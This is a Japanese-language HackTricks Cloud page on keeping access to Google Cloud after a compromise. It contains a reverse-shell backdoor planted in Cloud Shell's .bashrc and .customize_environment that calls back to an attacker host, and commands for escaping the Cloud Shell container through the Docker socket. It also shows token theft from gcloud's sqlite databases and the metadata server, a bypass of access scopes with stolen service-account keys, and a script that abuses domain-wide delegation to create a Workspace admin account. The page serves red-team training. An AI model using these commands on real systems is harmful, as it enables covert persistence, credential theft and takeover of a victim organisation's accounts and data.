# GCP - 非svc永続性

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

これらは、何らかの方法でGCPの資格情報やGCP環境で実行されているマシンを侵害した後に役立つテクニックです。

## GoogleのCloud Shell <a href="#e5eb" id="e5eb"></a>

### 永続的バックドア

[**Google Cloud Shell**](https://cloud.google.com/shell/)は、関連するコストなしで、ブラウザから直接クラウドリソースへのコマンドラインアクセスを提供します。

GoogleのCloud Shellには、**ウェブコンソール**から、または**`gcloud cloud-shell ssh`**を実行してアクセスできます。

このコンソールには攻撃者にとって興味深い機能がいくつかあります：

1. **Google Cloudにアクセスできる任意のGoogleユーザー**は、完全に認証されたCloud Shellインスタンスにアクセスできます。
2. 当該インスタンスは、活動がない場合でも少なくとも120日間はホームディレクトリを維持します。
3. 組織がそのインスタンスの活動を監視する**能力はありません**。

これは基本的に、攻撃者がユーザーのホームディレクトリにバックドアを設置し、ユーザーが少なくとも120日ごとにGC Shellに接続する限り、バックドアは生き残り、攻撃者は実行するたびにシェルを取得することができることを意味します。
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
ホームフォルダには、**`.customize_environment`** という別のファイルがあり、存在する場合、ユーザーが**cloud shell**にアクセスする**毎回実行されます**（前述のテクニックのように）。前のバックドアを挿入するか、以下のようなものを挿入して、ユーザーが"頻繁に"cloud shellを使用する限り、永続性を維持します：
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
**Cloud Shellで認証が必要なアクションを初めて実行する際**には、コマンドが実行される前にユーザーのブラウザに認証ウィンドウが**ポップアップ**します。予期せぬポップアップが表示されると、ターゲットが疑念を抱き、永続性の方法を潰す可能性があります。
{% endhint %}

### Google Cloud Shell コンテナ脱出

Google Cloud Shellはコンテナ内で動作していることに注意してください。ホストに**簡単に脱出する**方法は以下の通りです:
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
```markdown
Googleによって脆弱性とは見なされていませんが、その環境で何が起こっているかの広い視野を与えてくれます。

さらに、ホストからサービスアカウントトークンを見つけることができることに注意してください：
```
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
次のスコープを使用して：
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## トークンハイジャック

### 認証済みユーザー

**GCPの認証済みユーザー**のホームフォルダにアクセスできた場合、**デフォルト**では、認証する必要がなく、使用するマシンに依存せず、ユーザーがMFAを設定していても、そのユーザーのトークンを好きなだけ**取得できます**。

これは、デフォルトでは、新しいトークンを生成するために、リフレッシュトークンを好きなだけ**使用できる**からです。

ユーザーの現在のトークンを取得するには、次のコマンドを実行します：

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
```
新しいアクセストークンを生成するための詳細を取得するには、以下を実行します:
```
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
```
gcloud auth print-access-token --client-id="YOUR_CLIENT_ID" --client-secret="YOUR_CLIENT_SECRET" --refresh-token="YOUR_REFRESH_TOKEN"
```
{% endcode %}

新しいアクセストークンをリフレッシュトークン、クライアントID、クライアントシークレットを使用して取得するには、以下を実行します：

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

### サービスアカウント

認証されたユーザーと同様に、サービスアカウントの**プライベートキーファイルを侵害する**ことができれば、通常、**好きなだけアクセスできます**。\
しかし、サービスアカウントの**OAuthトークンを盗む**ことは、デフォルトではこれらのトークンが1時間しか役に立たないにもかかわらず、もっと興味深いかもしれません。なぜなら、**被害者がプライベートAPIキーを削除しても、OAuthトークンは有効期限が切れるまで有効**だからです。

### メタデータ

明らかに、GCP環境で動作しているマシン内にいる限り、メタデータエンドポイントに接触してそのマシンに添付されたサービスアカウントに**アクセスできます**（このエンドポイントでアクセスできるOAuthトークンは通常、スコープによって制限されていることに注意してください）。

### 対策

これらの技術に対するいくつかの対策は、[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)で説明されています。

## アクセススコープのバイパス <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

[アクセススコープ](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)が使用される場合、コンピューティングインスタンス（VM）に生成されるOAuthトークンには[**スコープ**](https://oauth.net/2/scope/)**制限が含まれます**。しかし、侵害されたアカウントが持つ権限を悪用して、この制限を**バイパス**することができるかもしれません。

この制限を**バイパスする最良の方法**は、侵害されたホストで**新しい資格情報を見つける**か、制限なしでOAuthトークンを生成するための**サービスキーを見つける**か、または**制限の少ない異なるVMにジャンプする**ことです。

**別のボックスをポップする**

環境内には、より制限の少ないアクセススコープを持つ別のボックスが存在する可能性があります。`gcloud compute instances list --quiet --format=json`の出力を見ることができれば、特定のスコープを持つインスタンス、または**`auth/cloud-platform`**の全包括的なスコープを持つインスタンスを探します。

また、デフォルトのサービスアカウント（`PROJECT_NUMBER-compute@developer.gserviceaccount.com`）が割り当てられているインスタンスにも注意してください。

**サービスアカウントキーを検索する**

Googleは非常に明確に述べています。[**"アクセススコープはセキュリティメカニズムではありません... OAuthを介して認証されないリクエストを行う場合、それらは効果がありません"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)。

したがって、インスタンス上に保存されている[**サービスアカウントキー**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys)を**見つけた場合**、制限をバイパスできます。これらは**RSAプライベートキー**であり、Google Cloud APIに対して認証を行い、スコープ制限のない新しいOAuthトークンを**要求するために使用できます**。

任意のサービスアカウントがいつかキーをエクスポートしたかを確認します。
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo "Looking for keys for $i:"
gcloud iam service-accounts keys list --iam-account $i
done
```
これらのファイルは**デフォルトではCompute Instanceに保存されていません**ので、これらを見つけるには幸運が必要です。ファイルのデフォルト名は`[project-id]-[portion-of-key-id].json`です。したがって、プロジェクト名が`test-project`であれば、このキーファイルを探すために**ファイルシステムで`test-project*.json`を検索**できます。

ファイルの内容は以下のようなものです：
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
また、**CLIから生成された場合**、次のようになります：
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
もしこのようなファイルを見つけた場合、**`gcloud` コマンドにこのサービスアカウントで再認証するように**指示できます。これはインスタンス上、またはツールがインストールされている任意のマシン上で行うことができます。
```bash
gcloud auth activate-service-account --key-file [FILE]
```
以下のようにして、新しいOAuthトークンを**テスト**できます：
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
以下のスコープに `https://www.googleapis.com/auth/cloud-platform` が表示されているはずです。これは、**インスタンスレベルのアクセススコープによって制限されていない**ことを意味します。割り当てられたIAM権限をすべて使用する権力を持っています。

## Workspaceへの権限委任による拡散 <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com)はGoogleの**コラボレーションと生産性プラットフォーム**で、Gmail、Googleカレンダー、Googleドライブ、Googleドキュメントなどが含まれています。

GCPの**サービスアカウント**は、正当なユーザーになりすましてWorkspace内のユーザーデータにプログラム的にアクセスする**権利**を付与されることがあります。これは[ドメイン全体の委任](https://developers.google.com/admin-sdk/reports/v1/guides/delegation)として知られています。これには、GMailでの**メールの読み取り**、Googleドキュメントへのアクセス、さらにはG Suite組織内での新しいユーザーアカウントの作成などのアクションが含まれます。

WorkspaceにはGCPとは完全に別の[独自のAPI](https://developers.google.com/gsuite/aspects/apis)があります。権限はWorkspaceに付与され、**GCPとWorkspaceの間にはデフォルトの関係はありません**。

しかし、サービスアカウントにWorkspaceユーザーの**権限**を**与える**ことは可能です。この時点でWeb UIにアクセスできる場合は、**IAM -> サービスアカウント**に移動して、いずれかのアカウントが**「ドメイン全体の委任」列に「有効」と表示されているか**を確認できます。アカウントが有効になっていない場合、列自体が**表示されない可能性があります**（各サービスアカウントの詳細を読んでこれを確認できます）。この記事を書いている時点では、これをプログラム的に行う方法はありませんが、Googleのバグトラッカーには[この機能のリクエスト](https://issuetracker.google.com/issues/116182848)があります。

この関係を作成するには、GCPとWorkforceの両方で**有効にする必要があります**。

#### Workspaceアクセスのテスト

このアクセスをテストするには、**JSON**形式でエクスポートされた**サービスアカウントの資格情報**が必要です。これは以前のステップで取得したか、またはドメイン全体の委任が有効になっていることがわかっているサービスアカウントのキーを作成するために必要なアクセス権を持っているかもしれません。

このトピックは少し難しいです... サービスアカウントには「client\_email」と呼ばれるものがあり、エクスポートしたJSON資格情報ファイルで確認できます。おそらく `account-name@project-name.iam.gserviceaccount.com` のように見えるでしょう。委任が有効になっていても、そのメールアドレスで直接Workforce APIコールにアクセスしようとすると失敗します。これは、WorkforceディレクトリにはGCPサービスアカウントのメールアドレスが含まれていないためです。代わりに、Workforceとやり取りするには、実際に有効なWorkforceユーザーをなりすます必要があります。

本当にやりたいことは、**管理者アクセス権を持つユーザーになりすまし**、そのアクセスを使用して、パスワードのリセット、多要素認証の無効化、または新しい管理者アカウントを作成するなどのことを行うことです。

Gitlabは[このPythonスクリプト](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py)を作成しました。これはユーザーディレクトリのリスト表示と新しい管理者アカウントの作成の2つのことができます。以下のように使用します：
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
以下のスクリプトを様々なメールアドレスに対して試して、**様々な** **ユーザー**を偽装できます。標準出力は、サービスアカウントがWorkforceにアクセスできるかどうかを示し、新しい管理者アカウントが作成された場合は、**ランダムなパスワード**も含まれます。

新しい管理者アカウントの作成に成功した場合、[Google管理コンソール](https://admin.google.com)にログインして、G Suiteのすべてのユーザーのメール、ドキュメント、カレンダーなど、すべてを完全に制御できます。存分に活用してください。

## 参考文献

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSのハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
